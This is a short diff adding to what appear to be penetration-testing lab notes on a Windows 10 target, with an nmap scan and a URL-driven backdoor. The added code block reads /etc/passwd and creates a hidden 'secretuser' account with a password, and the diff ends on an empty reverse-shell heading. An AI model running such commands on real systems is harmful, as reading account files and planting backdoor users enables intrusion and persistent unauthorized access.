@@ -160,4 +160,11 @@ sudo nmap -sV -p 80 <Win10-IP>
 
 - Backdoor can run commands from the URL
 ![](https://i.imgur.com/HJivVJH.png)
+![](https://i.imgur.com/uIvJQqO.png)
+```
+cat /etc/passwd
+net user secretuser 1q2w3e4r! /add
+```
 
+- Netcat Reverse Shell for Windows
+- 
